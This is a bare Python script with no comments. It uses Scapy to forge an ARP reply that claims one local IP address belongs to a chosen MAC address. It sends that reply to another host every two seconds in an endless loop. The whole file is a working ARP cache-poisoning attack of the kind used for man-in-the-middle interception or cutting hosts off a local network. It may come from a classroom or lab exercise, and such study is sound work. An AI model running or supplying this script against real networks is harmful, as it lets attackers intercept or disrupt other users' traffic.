import time
from scapy.all import *

arp = ARP( op=2,psrc="172.17.62.80",pdst="172.17.62.251",hwdst="00:00:00:00:00:00",hwsrc="6C:62:6D:6F:4F:59" )
print("1234567890")
while True :
    send(arp)
    time.sleep(2)
